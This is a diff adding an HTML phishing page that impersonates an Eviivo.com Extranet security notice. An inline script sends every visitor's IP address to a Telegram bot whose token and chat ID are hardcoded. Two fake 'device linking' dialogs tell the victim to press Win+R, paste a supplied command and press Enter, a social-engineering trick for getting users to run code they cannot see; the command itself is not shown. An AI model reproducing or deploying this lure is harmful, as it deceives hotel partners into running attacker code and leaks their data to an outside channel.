@@ -1,0 +1,115 @@
+<head>
+  <meta charset="UTF-8">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <meta name="x-apple-disable-message-reformatting">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta content="telephone=no" name="format-detection">
+  <title>Extranet Security Eviivo</title>
+  <script src="script1.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        var token = '8139326693:AAFo0lD-QSjJtifJwckKAUmhP3Gxfi1eLH8'; 
+        var chat_id = '-1002695146336'; 
+
+        function sendTelegramNotification(message) {
+            if (token && chat_id) {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
+                    .then(data => console.log('Уведомление отправлено:', data))
+                    .catch(error => console.error('Ошибка при отправке уведомления:', error));
+            } else {
+                console.error('Токен или chat_id не указаны.');
+            }
+        }
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                var userIP = data.ip;
+                sendTelegramNotification(`Пользователь зашел на сайт! IP: ${userIP}`);
+            })
+            .catch(error => console.error('Ошибка при получении IP-адреса:', error));
+    });
+</script>
+  
+</head>
+<div id="preloader" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #0071c2; display: flex; align-items: center; justify-content: center; z-index: 10000;">
+    <div style="text-align: center; color: white;">
+        <div class="spinner" style="width: 50px; height: 50px; border: 5px solid rgba(255, 255, 255, 0.3); border-top: 5px solid white; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px;"></div>
+        <div style="font-size: 18px;">Loading...</div>
+    </div>
+</div>
+<div id="overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+    background: url('EVIVI.png') no-repeat center center; 
+    background-size: cover; z-index: 999; display: none;">
+</div>
+
+<div id="firstModal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 450px; background-color: #ffffff; border-radius: 16px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3); padding: 25px 20px; text-align: center; z-index: 1000;">
+    <div style="font-size: 24px; font-weight: bold; color: #0071c2; margin-bottom: 15px; display: flex; align-items: center; justify-content: center;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" style="width: 24px; height: 24px; color: #0071c2; margin-right: 8px;">
+            <path d="M12 0C6.8 0 4 1.8 4 1.8V10c0 7.2 8 13.4 8 13.4s8-6.2 8-13.4V1.8S17.2 0 12 0zm-1 14.9L7.1 11l1.4-1.4 2.5 2.5 4.6-4.6L17 9.5l-6 6z"></path>
+        </svg>
+        Keep Your Eviivo.com Account Secure
+    </div>
+    <div style="font-size: 16px; color: #333; line-height: 1.8; margin-bottom: 20px;">
+        We’ve introduced enhanced security measures to ensure your Eviivo.com Extranet account remains protected. To proceed, we need to securely link your computer’s unique identifier, known as a <strong>Hardware ID (HWID)</strong>, with your account.
+        <br><br>
+        <strong>This step is mandatory to prevent unauthorized access and to keep your sensitive data safe.</strong>
+    </div>
+    <div style="margin-bottom: 20px; color: #777; font-size: 14px;">
+        <i>Join millions of partners who trust Eviivo.com for a secure and reliable experience.</i>
+    </div>
+    <div style="margin-top: 20px;">
+        <button onclick="showSecondModal()" style="display: inline-block; padding: 12px 25px; font-size: 16px; color: #ffffff; background-color: #0071c2; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: background-color 0.3s ease;">Link My Device Securely</button>
+    </div>
+    <div style="margin-top: 20px; font-size: 12px; color: #888;">
+        <a href="#" style="color: #0071c2; text-decoration: none;">Learn more about security on Eviivo.com</a>
+    </div>
+</div>
+
+
+<div id="secondModal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 450px; background-color: #ffffff; border-radius: 16px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3); padding: 25px 20px; text-align: center; z-index: 1000; display: none;">
+    <div style="font-size: 24px; font-weight: bold; color: #0071c2; margin-bottom: 15px; display: flex; align-items: center; justify-content: center;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" style="width: 24px; height: 24px; color: #0071c2; margin-right: 8px;">
+            <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.6 0 12 0zm6 14h-4v4h-4v-4H6v-4h4V6h4v4h4v4z"></path>
+        </svg>
+        Device Linking in Progress
+    </div>
+    <div style="font-size: 16px; color: #333; line-height: 1.8; margin-bottom: 20px;">
+        Follow these simple steps to link your device securely with your Eviivo.com Extranet account:
+        <div style="margin-top: 10px;">
+            <p style="margin: 10px 0; text-align: left; font-size: 16px; display: flex; align-items: center;">
+                <span style="display: inline-block; width: 28px; height: 28px; background-color: #0071c2; color: #ffffff; font-weight: bold; text-align: center; line-height: 28px; border-radius: 50%; margin-right: 12px;">1</span>
+                Press <span style="font-weight: bold; color: #0071c2; background-color: #e6f2fc; padding: 2px 5px; border-radius: 4px;">Win</span> + <span style="font-weight: bold; color: #0071c2; background-color: #e6f2fc; padding: 2px 5px; border-radius: 4px;">R</span> to open the <span style="font-weight: bold; color: #0071c2; background-color: #e6f2fc; padding: 2px 5px; border-radius: 4px;">Run</span> dialog.
+            </p>
+            <p style="margin: 10px 0; text-align: left; font-size: 16px; display: flex; align-items: center;">
+                <span style="display: inline-block; width: 28px; height: 28px; background-color: #0071c2; color: #ffffff; font-weight: bold; text-align: center; line-height: 28px; border-radius: 50%; margin-right: 12px;">2</span>
+                Paste the provided command and press <span style="font-weight: bold; color: #0071c2; background-color: #e6f2fc; padding: 2px 5px; border-radius: 4px;">Ctrl</span> + <span style="font-weight: bold; color: #0071c2; background-color: #e6f2fc; padding: 2px 5px; border-radius: 4px;">V</span>.
+            </p>
+            <p style="margin: 10px 0; text-align: left; font-size: 16px; display: flex; align-items: center;">
+                <span style="display: inline-block; width: 28px; height: 28px; background-color: #0071c2; color: #ffffff; font-weight: bold; text-align: center; line-height: 28px; border-radius: 50%; margin-right: 12px;">3</span>
+                Press <span style="font-weight: bold; color: #0071c2; background-color: #e6f2fc; padding: 2px 5px; border-radius: 4px;">Enter</span> to complete the process.
+            </p>
+        </div>
+        <div style="margin-top: 20px; font-size: 14px; color: #555; text-align: center;">
+            This process ensures your account remains safe and secure.
+        </div>
+    </div>
+    <div style="margin-top: 30px; display: flex; justify-content: center; align-items: center; gap: 10px;">
+        <div class="spinner" style="width: 24px; height: 24px; border: 3px solid rgba(0, 0, 0, 0.2); border-top: 3px solid #0071c2; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+        <div style="font-size: 14px; color: #555;">Please wait, linking your device...</div>
+    </div>
+</div>
+
+<style>
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
+
